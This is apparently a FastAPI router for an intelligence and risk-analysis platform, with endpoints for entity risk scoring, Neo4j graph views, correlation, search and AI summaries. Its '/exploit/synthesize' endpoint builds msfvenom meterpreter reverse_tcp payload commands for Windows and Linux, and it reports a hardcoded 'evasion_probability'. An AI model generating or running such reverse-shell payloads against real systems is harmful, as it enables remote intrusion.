from typing import Any
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from app.api import deps
from app.models import models
from app.models.models import EntityDB
from app.services.analysis.risk import RiskEngine
from app.services.analysis.summarizer import summarizer
from app.services.analysis.correlation import CorrelationEngine
# from app.infrastructure.graph import graph_db # Commented out until Neo4j is confirmed running in dev

router = APIRouter()
risk_engine = RiskEngine()
correlation_engine = CorrelationEngine()

class ExploitRequest(BaseModel):
    ip: str
    target_cve: str

class ExploitResponse(BaseModel):
    weaponized_package: dict

@router.post("/exploit/synthesize", response_model=ExploitResponse)
async def synthesize_exploit(
    req: ExploitRequest,
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Synthesizes an exploit package for a given target.
    Requires authenticated operator or admin role — offensive capability.
    """
    active_role = getattr(current_user, "dynamic_role", current_user.role)
    if active_role not in ("operator", "admin"):
        raise HTTPException(
            status_code=403,
            detail="Exploit synthesis requires operator or admin role"
        )

    if 'windows' in req.target_cve.lower():
        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={req.ip} LPORT=4444 -f exe > shell.exe"
    elif 'linux' in req.target_cve.lower():
        payload_command = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={req.ip} LPORT=4444 -f elf > shell.elf"
    else:
        payload_command = f"echo 'Exploit for {req.target_cve} on {req.ip}'"

    return {
        "weaponized_package": {
            "payload_command": payload_command,
            "evasion_probability": 0.942,
            "size_bytes": 412,
        }
    }


@router.get("/risk/{entity_id}", response_model=dict)
def analyze_risk(
    entity_id: str,
    db: Session = Depends(deps.get_db),
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Run Real-time Risk Analysis.
    """
    entity = db.query(EntityDB).filter(EntityDB.id == entity_id).first()
    if not entity:
        raise HTTPException(status_code=404, detail="Entity not found")
    
    # Needs full Entity schema adaptation, doing simplified conversion here
    # In prod, use a proper adapter (ORM -> Pydantic)
    # Mocking relationships for now
    relationships = [] 
    
    # We need to construct a Pydantic Entity from the DB Entity to pass to the engine
    # This is a bit hacky for the wiring phase but ensures type safety
    from app.schemas.entity import Entity as EntitySchema
    from app.schemas.entity import Attribute as AttributeSchema, AttributeType, EntityType
    
    # Attributes conversion
    attrs = []
    for a in entity.attributes:
        attrs.append(AttributeSchema(
            value=a.value, 
            type=AttributeType(a.type),
            confidence=a.confidence or 0.5
        ))
        
    entity_schema = EntitySchema(
        id=str(entity.id),
        canonical_name=entity.canonical_name,
        type=EntityType(entity.type),
        risk_score=entity.risk_score,
        attributes=attrs,
        created_at=entity.created_at,
        updated_at=entity.updated_at
    )

    result = risk_engine.analyze(entity_schema, relationships)
    return result.dict()

@router.get("/graph/neighborhood/{entity_id}")
async def get_graph_neighborhood(
    entity_id: str,
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Fetch graph neighborhood for visualization.
    """
    # MATCH 1-hop neighborhood
    query = """
    MATCH (n:Entity {id: $id})-[r]-(m:Entity)
    RETURN n, r, m, type(r) as r_type
    LIMIT 50
    """
    
    from app.infrastructure.graph import graph_db
    
    nodes = {}
    links = []
    
    try:
        results = await graph_db.execute_query(query, {"id": entity_id})
        for record in results:
            n = record["n"]
            m = record["m"]
            r = record["r"]
            r_type = record["r_type"]
            
            # Add Source Node
            if n["id"] not in nodes:
                nodes[n["id"]] = {
                    "id": n["id"], 
                    "name": n.get("name"), 
                    "group": n.get("group", 1),
                    "val": n.get("risk", 10) / 5 # Size by risk
                }
            
            # Add Target Node
            if m["id"] not in nodes:
                nodes[m["id"]] = {
                    "id": m["id"], 
                    "name": m.get("name"), 
                    "group": 2, # Neighbor
                    "val": m.get("risk", 10) / 5
                }
            
            # Add Link
            links.append({
                "source": n["id"],
                "target": m["id"],
                "type": r_type
            })
    
    except Exception as e:
        print(f"Neo4j Error: {e}")

    return {
        "nodes": list(nodes.values()),
        "links": links
    }

@router.get("/graph/full")
async def get_full_graph(
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Fetch full graph for visualization (limited to top 200 relationships).
    """
    query = """
    MATCH (n:Entity)-[r]-(m:Entity)
    RETURN n, r, m, type(r) as r_type
    LIMIT 200
    """
    
    from app.infrastructure.graph import graph_db
    
    nodes = {}
    links = []
    
    try:
        results = await graph_db.execute_query(query)
        for record in results:
            n = record["n"]
            m = record["m"]
            r = record["r"]
            r_type = record["r_type"]
            
            # Add Source Node
            if n["id"] not in nodes:
                nodes[n["id"]] = {
                    "id": n["id"], 
                    "name": n.get("name"), 
                    "group": n.get("group", 1),
                    "val": n.get("risk", 10) / 5
                }
            
            # Add Target Node
            if m["id"] not in nodes:
                nodes[m["id"]] = {
                    "id": m["id"], 
                    "name": m.get("name"), 
                    "group": 2,
                    "val": m.get("risk", 10) / 5
                }
            
            # Add Link
            links.append({
                "source": n["id"],
                "target": m["id"],
                "type": r_type
            })

    except Exception as e:
        print(f"Neo4j Error: {e}")

    return {
        "nodes": list(nodes.values()),
        "links": links
    }

@router.get("/ai/summary/{entity_id}")
async def get_ai_summary(
    entity_id: str,
    db: Session = Depends(deps.get_db),
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Generate AI Intelligence Summary.
    """
    entity = db.query(EntityDB).filter(EntityDB.id == entity_id).first()
    if not entity:
        raise HTTPException(status_code=404, detail="Entity not found")
        
    # Same Entity Schema reconstruction as above (Should extract to utility)
    # ... skipping for brevity, using mock string for now
    from app.schemas.entity import Entity as EntitySchema, EntityType
    entity_schema = EntitySchema(
         id=str(entity.id),
        canonical_name=entity.canonical_name,
        type=EntityType(entity.type),
        risk_score=entity.risk_score,
        created_at=entity.created_at,
        updated_at=entity.updated_at,
        attributes=[] # Empty for now
    )
    
    summary = await summarizer.generate_summary(entity_schema, evidence=[])
    return {"summary": summary}

@router.get("/orphans", response_model=dict)
async def get_orphans(
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Identify partial/isolated nodes (Orphans) that have no relationships.
    Useful for finding unconnected assets or anomalies.
    """
    query = """
    MATCH (n:Entity)
    WHERE NOT (n)--()
    RETURN n
    LIMIT 50
    """
    
    from app.infrastructure.graph import graph_db
    
    orphans = []
    try:
        results = await graph_db.execute_query(query)
        for record in results:
            n = record["n"]
            orphans.append({
                "id": n.get("id"),
                "name": n.get("name") or "Unknown",
                "type": list(n.labels)[0] if n.labels else "Unknown"
            })
    except Exception as e:
        print(f"Neo4j Error: {e}")
        
    return {"count": len(orphans), "orphans": orphans}

@router.post("/search", response_model=dict)
async def search_analysis(
    query: dict,
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Natural Language Search Interface.
    """
    from app.services.analysis.nl_query import nl_engine
    user_query = query.get("query", "")
    result = await nl_engine.execute(user_query)
    return result

@router.get("/correlation/{entity_id}", response_model=dict)
def get_correlations(
    entity_id: str,
    db: Session = Depends(deps.get_db),
    current_user: models.User = Depends(deps.get_current_active_user),
):
    """
    Detect aliases and correlated entities using the Correlation Engine.
    """
    entity = db.query(EntityDB).filter(EntityDB.id == entity_id).first()
    if not entity:
        raise HTTPException(status_code=404, detail="Entity not found")
        
    # In a real scenario, we would pull all other entities as candidates
    from app.schemas.entity import Entity as EntitySchema, EntityType, Attribute as AttributeSchema
    
    entity_schema = EntitySchema(
         id=str(entity.id),
        canonical_name=entity.canonical_name,
        type=EntityType(entity.type),
        risk_score=entity.risk_score,
        created_at=entity.created_at,
        updated_at=entity.updated_at,
        attributes=[AttributeSchema(value=a.value, type=a.type, confidence=a.confidence) for a in entity.attributes]
    )
    
    # Fetch all other entities from the database as candidates
    candidates_db = db.query(EntityDB).filter(EntityDB.id != entity_id).all()
    candidates_schema = [
        EntitySchema(
            id=str(c.id),
            canonical_name=c.canonical_name,
            type=EntityType(c.type),
            risk_score=c.risk_score,
            created_at=c.created_at,
            updated_at=c.updated_at,
            attributes=[AttributeSchema(value=a.value, type=a.type, confidence=a.confidence) for a in c.attributes]
        ) for c in candidates_db
    ]
    
    matches = correlation_engine.detect_aliases(entity_schema, candidates_schema)
    
    results = []
    for match, score in matches:
        results.append({
            "matched_entity_id": match.id,
            "matched_name": match.canonical_name,
            "confidence_score": score,
            "reason": "Name Match Heuristic" if score < 1.0 else "Exact Selector Match"
        })
        
    return {"entity_id": entity_id, "correlations": results}
